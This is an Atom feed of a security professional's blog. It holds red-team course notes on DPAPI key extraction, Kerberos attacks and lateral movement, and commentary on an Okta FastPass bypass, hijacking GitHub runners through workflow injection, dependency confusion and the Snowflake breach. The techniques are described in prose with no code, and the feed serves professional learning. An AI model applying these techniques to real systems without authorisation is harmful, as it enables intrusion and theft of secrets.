<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <title>John Tuyen</title>
    <subtitle>Adventures of Functional Mediocrity</subtitle>
    <link href="https://johntuyen.com/atom.xml" rel="self" type="application/atom+xml"/>
    <link href="https://johntuyen.com"/>
    <generator uri="https://www.getzola.org/">Zola</generator>
    <updated>2024-06-28T00:00:00+00:00</updated>
    <id>https://johntuyen.com/atom.xml</id>
    <entry xml:lang="en">
        <title>Experimenting writing for 30 Days</title>
        <published>2024-06-28T00:00:00+00:00</published>
        <updated>2024-06-28T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/30-days-of-writing/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/30-days-of-writing/</id>
        
        <content type="html">&lt;p&gt;You might wonder, what the heck is the point of this post? Am I thinking of starting to write a book or something? Nah, not inspired enough to do so. Rather, I&#x27;ve challeged myself to publish a post every single day regardless of the quality and type of content. What I wanted to experiment is the idea of creating a weekly newsletter that contains ideas, discoveries, and stories around mostly technology and information security space. During this experiment I discovered a few things about myself, content creation, and what it will take to succeed:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Mastering the art of journalistic writing in a quick manner is a skill. For me, if it&#x27;s a topic that is difficult to quickly consume, it&#x27;s hard to extract a clear concept that is concise and to the point especially when you have to ship the post by end of day as part of the challenge.&lt;&#x2F;li&gt;
&lt;li&gt;Learning to analyze articles while reading from a micro and macro point of view. Jotting down notes as I read along as the micro. When finishing the article, read the completed notes as a macro view and create a clear concept. Easier said than done (for me atleast).&lt;&#x2F;li&gt;
&lt;li&gt;Experimenting writing using my own voice and style is a powerful daily exercise if the purpose is to connect and communicate. It allows you to take risks and refine stories that you want to share without worrying the outcome.&lt;&#x2F;li&gt;
&lt;li&gt;Finding content is easy but curating content with purpose is harder. You would think that with all the news and social feeds, you would have unlimited content to choose from but it&#x27;s not the case I soon realized. Actively cutting through the noise is a messy chore and it&#x27;s not easy to find content that would deem worthy. For every 10 articles read, I would maybe find one decent article or social feed that I think is worth sharing. To solve this problem, I would write a web scraper to feed into an LLM with a prompt that would extrapolate the article according to my standards I&#x27;m looking for. Although, I don&#x27;t want to mechanize this process that seems unnatural. I still want to personally read and make my own opinions on it. This will be my next experiment that I&#x27;ll be tinkering with and I will be posting less going forward until I refine this process so it&#x27;s not as time consuming.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Adversary Tactics RTO - Day 4</title>
        <published>2024-06-27T00:00:00+00:00</published>
        <updated>2024-06-27T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/specterops-atrto-d4/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/specterops-atrto-d4/</id>
        
        <content type="html">&lt;p&gt;It&#x27;s the last day and it was a humbling experience. Today we focused on Bloodhound operations and opsec considerations, tapping into DPAPI and understanding the extraction mechanisms for local&#x2F;remote scenarios (underrated technique), and finally more dizzying details about kerberos attacks focusing on delegation methodologies. Here are couple of personal takeaways:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;BloodHound is not comprehensive and it has blind spots.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;This has always been my take about Bloodhound. Bloodhound in the real world doesn&#x27;t reflect the way you&#x27;ll see in labs nor as simple to execute in mature environments that has conducted Bloodhound assessments in the past. As mentioned in the class, SharpHound should still be used to understand the lay of the land but keep data collection as minimal as possible by scoping the collection method. I like this take on it: perform a full collection on a sacrifical host&#x2F;account that is unaffiliated with the main campaign.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;DPAPI: Master Key Extraction with the Domain Backup Key. If you have Domain Admin or equivalent privileges and you steal the DPAPI domain backup key, you can decrypt any domain user master key (and then associated DPAPI-protected data) forever! This key never changes, protect it like you would the krbtgt.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Two words: Holy shit 🤯. I find it neat that you can remotely retrieve a decrypted master key from a DC using MS-BKRP protocol.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Defensive debrief: Sysmon and HELK provides logging visibility to endpoints&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;This might be a controversial take but red teamers should know how defensive mechanics work to be a better operator in future engagements. Sysmon and HELK stack would give a better understanding of weighing benefits and risks of operational security and situational awareness.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Adversary Tactics RTO - Day 3</title>
        <published>2024-06-26T00:00:00+00:00</published>
        <updated>2024-06-26T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/specterops-atrto-d3/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/specterops-atrto-d3/</id>
        
        <content type="html">&lt;p&gt;Day 3 of training was focused on operational security tradecraft, lateral movement between forest trusts, all things kerberos, and certificate abuse paths. Today was a meaty session and a lot of knowledge drops of how beacons work, things to avoid and how to blend into the network. Building a high-level cheatsheet and mindmap would be beneficial for future reminders during engagements. Couple of quick takeaways for today:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Enumerate, Evaluate, Evade | Observe, Orient, Decide, Act&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Simple to follow but hard to execute. Understanding risks and rewards during operation comes with experience, not everyone sees the same way.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;RC4 will be deprecated in the future Windows releases (2025?)&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;In the near future, it will be harder to conduct Kerberos attacks that involve RC4 encryption. Which brings to the next point:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Kerberos and ticket forgery strategies&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Without a strong grasp of understanding how the authentication mechanics work, it&#x27;s hard to intuitively understand what the opsec implications are when navigating the recon, privesc, and lateral movement phases. Without the foundational knowledge, your skill ceiling as a red team operator is capped. Throughout the class, this book by &lt;a href=&quot;https:&#x2F;&#x2F;a.co&#x2F;d&#x2F;0dXUT5sh&quot;&gt;James Forshaw&lt;&#x2F;a&gt; has been mentioned several times as a must read masterpiece on this specific topic if you want to get better navigating around as an operator.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Adversary Tactics RTO - Day 2</title>
        <published>2024-06-25T00:00:00+00:00</published>
        <updated>2024-06-25T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/specterops-atrto-d2/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/specterops-atrto-d2/</id>
        
        <content type="html">&lt;p&gt;Day 2 of training was focused on adversary detection workflows and methodologies, credential abuse, situational awareness around AD, payload mechanics, lateral movement, and exploiting SQL databases. There is a lot to cover and as mentioned yesterday, it&#x27;s like drinking from a firehose of information and trying to catch up during lab time. Couple of quick takeaways that I thought was insightful:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Everything is stealthy when no one is looking.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Comically accurate. On the flipside, imagine if you had blue teams monitoring your test environment when you have an active engagement, it&#x27;s more stressful and harder to accomplish your objectives. Ask me how that went 😭&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Double hop problem when using kerberos authentication&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;When you execute code with WMI&#x2F;WinRM, you&#x27;ll receive a token with a network logon type, meaning the credentials are not actually sent to the host. This means that you can&#x27;t &amp;quot;double-hop&amp;quot; and execute any additional network connections from this compromised host. The workaround is steal&#x2F;create a token, pass the hash as the user, spawn a new process as the user, or use an existing ticket.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;0xthirteen&#x2F;SharpRDP&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;I never heard of this method before and I found it quite interesting to have part of the toolset. It&#x27;s a non-graphical mechanism for authenticated remote command execution via RDP. No more slow and noisy SOCKS pivoting just to execute a command with RDP.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Adversary Tactics RTO - Day 1</title>
        <published>2024-06-24T00:00:00+00:00</published>
        <updated>2024-06-24T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/specterops-atrto-d1/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/specterops-atrto-d1/</id>
        
        <content type="html">&lt;p&gt;Going to be a busy couple of days as I&#x27;m taking the SpecterOps Adversary Tactics Red Team Operations course. Operational security and situational awareness was the theme today. So far I&#x27;m impressed with the breadth and depth of the material. It&#x27;s not so much about the learning material but the trainers sharing valuable lessons learned in the field. One that stuck with me was this:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Always operate with purpose, sometimes you don&#x27;t need to privesc unless you have a goal in mind.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;That&#x27;s something you would say when you know Windows Internals inside and out. &lt;&#x2F;p&gt;
&lt;p&gt;If it&#x27;s one thing about this course, there isn&#x27;t too much time in between labs and letting the course material sink in. However, I think it is intentional as there is a lot of good stuff to cover. I&#x27;m not complaining, just have to buckle up and enjoy the ride.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Bypassing Okta’s Passwordless MFA: Analysis</title>
        <published>2024-06-23T00:00:00+00:00</published>
        <updated>2024-06-23T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/okta-passwordless/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/okta-passwordless/</id>
        
        <content type="html">&lt;blockquote&gt;
&lt;p&gt;Recognizing the vulnerabilities of MFA, the industry introduced passwordless authentication. This method eliminates the need for users to remember passwords, thereby reducing the risk of credential theft. Instead of “something you know,” users authenticate using “something you are,” such as a fingerprint or facial recognition. However, like all security measures, passwordless authentication is not immune to attacks.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Okta FastPass is a cryptographic multi-factor authenticator that facilitates passwordless authentication for any SAML, OIDC, or WS-Fed applications within Okta. It functions as a device-bound authenticator and is compatible with various operating systems through the Okta Verify application.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Okta Verify also supports biometric verification via Face ID or fingerprint recognition. If the user enables this option, an additional set of public&#x2F;private keys is generated from the hardware TPM, with the public key sent to Okta’s servers. This biometric verification feature is termed by Okta as a “User Verification” factor, or “something you are.”&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Okta FastPass is designed to be a phishing-resistant factor. This authentication method prevents access if an Adversary-in-the-Middle authentication flow (like Evilginx’s) is detected.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;img alt=&quot;okta passwordless&quot; title=&quot;okta passwordless&quot; src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;okta_passwordless.8ab1d9371b7aa51a.png&quot; srcset=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;okta_passwordless.8a375a2f3ef28d79.png 512w, https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;okta_passwordless.8ab1d9371b7aa51a.png 1024w&quot; class=&quot;&quot; &#x2F;&gt;

&lt;blockquote&gt;
&lt;p&gt;Is Passwordless Bulletproof? The short answer is no. Most implementations of passwordless device-bound and biometric MFA solutions generate cryptographic keys stored in the TPM. With the right access and permissions, these keys can be misused.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;OktaTerrify intercepts the token exchange between the attacker’s machine and Okta’s backend, emulating Okta FastPass. It also generates the OktaInk command lines to execute. OktaInk is executed on the victim’s machine to access the device-bound and user-verification factors, creating a valid FastPass token accepted by Okta’s backend.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;From a red team perspective, this &amp;quot;something you are&amp;quot; verification factor is making phishing more difficult going forward as you will need to first compromise a system in order to extract a key from Okta Verify&#x27;s database. I wish the post had more details around how it was reading the database in the first place. Is it not protected by using Windows Hello Enhanced Sign-In Security API?&lt;&#x2F;p&gt;
&lt;p&gt;This also means that phishing against Okta Fastpass won&#x27;t be used as a method of initial access, it&#x27;s more of persistence technique and potential lateral movement based on the user&#x27;s application access.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Hijacking GitHub Runners</title>
        <published>2024-06-22T00:00:00+00:00</published>
        <updated>2024-06-22T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/github-runners-compromise/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/github-runners-compromise/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.synacktiv.com&#x2F;publications&#x2F;hijacking-github-runners-to-compromise-the-organization&quot;&gt;Hijacking GitHub runners to compromise the organization&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Summary:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;In a recent engagement we managed to compromise a GitHub app allowed to register self-hosted runners at the organization level. Turns out, it is possible to register a GitHub runner with the ubuntu-latest tag, granting access to jobs originally designated for GitHub-provisioned runners. Using this method, an attacker could compromise any workflow of the organization and steal CI&#x2F;CD secrets or push malicious code on the different repositories.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;The fundamental breakdown of what to look out for and think about:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;the runs-on directive indicates that the workflow must run on a runner with the ubuntu-latest tag. This label is one of the tags meaning the workflow should be executed on a runner provided by GitHub. &lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;They are used to specify the type of runner and the operating system needed for a workflow. The ubuntu-latest label is quite common.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;this repository is protected with branch protections. Even with write access it would not be possible to deploy a malicious workflow with nord-stream to extract the different secrets, since the required_pull_request_reviews protection is enabled&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;img alt=&quot;&quot; title=&quot;&quot; src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;github_runner.5bbfca06bd426748.png&quot; srcset=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;processed_images&#x2F;github_runner.f071407d8f3e4362.png 512w&quot; class=&quot;&quot; &#x2F;&gt;

&lt;blockquote&gt;
&lt;p&gt;This workflow is set to run when a comment is posted on a pull request. Between lines 12 and 22, it retrieves the pull request reference associated with the comment. It then uses the GitHub API through some JavaScript to obtain the branch reference of the targeted pull request. Finally, the code performs a checkout of the code coming from the pull request at line 26.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Contexts can be accessed using the following expression syntax: &lt;code&gt;${{ &amp;lt;context&amp;gt; }}&lt;&#x2F;code&gt;. At runtime, the context will be replaced with the associated value, like a match and replace.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;The vulnerability is present at line 25. The code uses the GitHub context to obtain a reference to the pull request, which corresponds to the branch name of the pull request. This branch name is under the attacker&#x27;s control, meaning they can create a dummy pull request with the following branch name. Then to trigger the vulnerable code, the attacker just need to create a comment on the associated pull request.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;It&#x27;s like anything else when looking for code injection within a software stack. Researching what Github Runners are about and understand what user controlled variables allowed in a workflow to gain server-side code execution. All this does take time unless you are a specialist in secdevops of which is in their wheelhouse.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Dependency Confusion</title>
        <published>2024-06-21T00:00:00+00:00</published>
        <updated>2024-06-21T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/dependency-confusion/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/dependency-confusion/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;observationsinsecurity.com&#x2F;2024&#x2F;04&#x2F;25&#x2F;how-i-hacked-into-googles-internal-corporate-assets&quot;&gt;How I Hacked Into Google&#x27;s Internal Corporate Assets&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;I focused on open-source and supply chain attacks. Over the period of a week I discovered multiple vulnerabilities, and gained control of (read: “command injection on”) numerous in-scope bug bounty assets.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Six of these assets were Google’s internal corporate assets, many more belonged to a self-driving car company’s build CI&#x2F;CD pipeline and others I can’t share the details on. These findings were mostly critical with high impact.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Many of the applications and software we use every day as consumers (ie. banking apps, government services, social media, etc) heavily depend on these open source libraries, often referred to as “dependencies”.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;significant issue arises when an external attacker identifies and registers a public package that an organization is exclusively using internally.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;programming languages like Node.js and Python are programmed to automatically retrieve a public version of the package if no local version is available – or if the public version is higher.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;That covers what dependency confusion vulnerability is about. It seems easy but it&#x27;s somewhat trivial depending on how the CI&#x2F;CD is configured of which the author later mentions without much details. I&#x27;m guessing code execution is one thing but getting the data outside is another problem?&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;It is likely that many large organizations are vulnerable to dependency confusion in some way and I still believe this to be true even after my exploits – in fact, more-so now. Although I don’t have evidence, I’ve had enough anecdotal conversations to get the impression that not many tech companies are taking an organized and risk based approach to uplifting the security of their CI&#x2F;CD pipelines. This is not something that security attestations like SOC2 or ISO27001 cover but it is a critical area of risk for software development.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;As an aside, I went to a security conference recently, where a security vendor was selling a tool to solve this exact problem. You don’t need to buy a tool to solve this problem and it reinforced to me that this issue is not well understood by security teams – and that is the second fundamental reason why I figured this particular endeavor worthy of some time and effort. &lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;This part is a neat insight from a industry professional and it&#x27;s how I approach things as well. Figuring out what is not heavily covered in standards and go after those weak security controls.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;This is significant because the names of these internal dependencies can align to names of publicly available names; names that are contained in functions in externally accessible code or even the names of externally accessible apis or services. Extending on this hypothesis, developers might use names that are associated with core products or features. Because of this, a degree of discovering these in public javascript and&#x2F;or brute forcing them is possible&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;This is where bulk of the recon scanning for possible dependency names come into play. Scraping live and archived data to figure out what the possible filename convention could be and try the attack out.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Organizations impacted the most were those running continuous delivery and deployment. It didn’t impact software that had a slower development cycle, this is because with continuous delivery and deployment, artifacts are called regularly and automatically and so risk of compromise within a given timeframe is much more likely. &lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;This also impacts developers. I’d often have developers installing my packages on their local development machines due to a general lack of awareness or vigilance around open source risks. &lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;I&#x27;m going to give this a try in my next engagement, it does stir up some ideas of what can be possible.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Apple Private Cloud Compute: First Glance</title>
        <published>2024-06-20T00:00:00+00:00</published>
        <updated>2024-06-20T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/apple-pcc/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/apple-pcc/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;blog.trailofbits.com&#x2F;2024&#x2F;06&#x2F;14&#x2F;pcc-bold-step-forward-not-without-flaws&#x2F;&quot;&gt;PCC: Bold step forward, not without flaws&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;security.apple.com&#x2F;blog&#x2F;private-cloud-compute&#x2F;&quot;&gt;Private Cloud Compute: A new frontier for AI privacy in the cloud&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;It&#x27;s incredible how much effort that goes into a designing a solution like this from scratch and have security in mind. It&#x27;s not an easy feat but let&#x27;s take a look at some positives and negatives:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Private Cloud Compute hardware security starts at manufacturing, where we inventory and perform high-resolution imaging of the components of the PCC node before each server is sealed and its tamper switch is activated. When they arrive in the data center, we perform extensive revalidation before the servers are allowed to be provisioned for PCC.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Securing the supply chain ✅&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;We supplement the built-in protections of Apple silicon with a hardened supply chain for PCC hardware, so that performing a hardware attack at scale would be both prohibitively expensive and likely to be discovered. We limit the impact of small-scale attacks by ensuring that they cannot be used to target the data of a specific user.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Further securing the supply chain from attacks by making it crazy expensive if attempted at scale.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;The root of trust for Private Cloud Compute is our compute node: custom-built server hardware that brings the power and security of Apple silicon to the data center, with the same hardware security technologies used in iPhone, including the Secure Enclave and Secure Boot.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Baking in their existing hardware security technologies to hold keys and protection features. What about the ingress&#x2F;egress traffic?&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Target diffusion starts with the request metadata, which leaves out any personally identifiable information about the source device or user, and includes only limited contextual data about the request that’s required to enable routing to the appropriate model. This metadata is the only part of the user’s request that is available to load balancers and other data center components running outside of the PCC trust boundary. The metadata also includes a single-use credential, based on RSA Blind Signatures, to authorize valid requests without tying them to a specific user. Additionally, PCC requests go through an OHTTP relay — operated by a third party — which hides the device’s source IP address before the request ever reaches the PCC infrastructure.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;&amp;quot;Target diffusion&amp;quot;, I like the terminology. It&#x27;s a fancy way of saying we obfuscate your data and make sure it&#x27;s secretative while it&#x27;s in transit both ways.&lt;&#x2F;p&gt;
&lt;p&gt;I think that mostly covers all the physical security concerns. Moving onto software side of things:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Traditional cloud services do not make their full production software images available to researchers — and even if they did, there’s no general mechanism to allow researchers to verify that those software images match what’s actually running in the production environment. (Some specialized mechanisms exist, such as Intel SGX and AWS Nitro attestation.)&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;When we launch Private Cloud Compute, we’ll take the extraordinary step of making software images of every production build of PCC publicly available for security research. This promise, too, is an enforceable guarantee: user devices will be willing to send data only to PCC nodes that can cryptographically attest to running publicly listed software.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Every production Private Cloud Compute software image will be published for independent binary inspection — including the OS, applications, and all relevant executables, which researchers can verify against the measurements in the transparency log.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;They can&#x27;t say how much of the code will be released for security review but they claim said &amp;quot;extraordinary&amp;quot; and something that other cloud providers do not provide to an extent. This will be revisited at a later time once they give more details on how the attestation process works. Knowing Apple, I would be surprised if they were generous about how much &amp;quot;code&amp;quot; they&#x27;re willing to give for public review and access. They are quite secretive and restrictve in general (like any other company I guess).&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Stateless computation on personal user data. Private Cloud Compute must use the personal user data that it receives exclusively for the purpose of fulfilling the user’s request. This data must never be available to anyone other than the user, not even to Apple staff, not even during active processing. And this data must not be retained, including via logging or for debugging, after the response is returned to the user. In other words, we want a strong form of stateless data processing where personal data leaves no trace in the PCC system.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;There are several mentions of &amp;quot;stateless&amp;quot; computing and data processing which is great to protect data from being stored or used in places you don&#x27;t want to, especially when it&#x27;s sensitive data or even metadata. I like it already.&lt;&#x2F;p&gt;
&lt;p&gt;From an AI&#x2F;ML security perspective, Trail of Bits provided technical insights into the security and privacy limitations of AI&#x2F;ML workloads that Apple might be trying to solve. For instance hardware limitations with existing devices and the ecosystem that it lives in:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;The term “requires unencrypted access” is the key to the PCC design challenges. Apple could continue processing data on-device, but this means abiding by mobile hardware limitations. The complex ML workloads Apple wants to offload, like using Large Language Models (LLM), exceed what is practical for battery-powered mobile devices. Apple wants to move the compute to the cloud to provide these extended capabilities, but HE doesn’t currently scale to that level. Thus to provide these new capabilities of service presently, Apple requires access to unencrypted data.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;This is interesting as it does show a possible glimpse of the direction we are going to be moving towards in the future of mobile. Rather than waiting for a solution to solving the hard problem of increasing battery life on mobile devices, it may eventually be a energy efficient slimmer screen along with a regular sized battery that will last for days without charge. All the computing will be performed at provider&#x27;s Edge network and all your data will be stored on the cloud. It&#x27;s not too far fetched to be moving towards this direction and we&#x27;re already seeing signs of it. If we do go down this road, are we willing to trust your provider that they are going to respect your privacy? How would you verify it? Are you okay with being locked into a single vendor? Can we opt out of this edge computing network? Would this edge compute model operate differently in other countries? These are all hard questions to be answering for a vendor and as a consumer. Interesting times we live in.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Snowflake Data Breach</title>
        <published>2024-06-19T00:00:00+00:00</published>
        <updated>2024-06-19T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/snowflake-ticketmaster/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/snowflake-ticketmaster/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.wired.com&#x2F;story&#x2F;epam-snowflake-ticketmaster-breach-shinyhunters&quot;&gt;Hackers Details How They Allegedly Stole Ticketmaster Data From Snowflake&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;About 165 customer accounts were potentially affected in the recent hacking campaign targeting Snowflake’s customers, but only a few of these have been identified so far.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Wired, however, has independently confirmed that it was a Snowflake account; the stolen data included bank account details for 30 million customers, including 6 million account numbers and balances, 28 million credit card numbers, and human resources information about staff, according to a post published by the hackers. Lending Tree and Advance Auto Parts have also said they might be victims as well.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Quite significant considering what has announced publicly so far. I hope others have data salted and hashed at the very minimum.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;The hacker who spoke with WIRED says that a computer belonging to one of EPAM’s employees in Ukraine was infected with info-stealer malware through a spear-phishing attack. It’s unclear if someone from ShinyHunters conducted this initial breach or just purchased access to the infected system from someone else who hacked the worker and installed the infostealer. The hacker says that once on the EPAM worker’s system, they installed a remote-access Trojan, giving them complete access to everything on the worker’s computer.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Hackers installed a RAT on a machine? Two scenarios that came to mind is this user&#x27;s machine has local admin privileges enabled or the adversaries were clever enough to privesc without alerting AV&#x2F;EDR. Both of which are a clear indication that device compliance isn&#x27;t strongly enforced.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Using this access, they say, they found unencrypted usernames and passwords that the worker used to access and manage EPAM customers’ Snowflake accounts&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
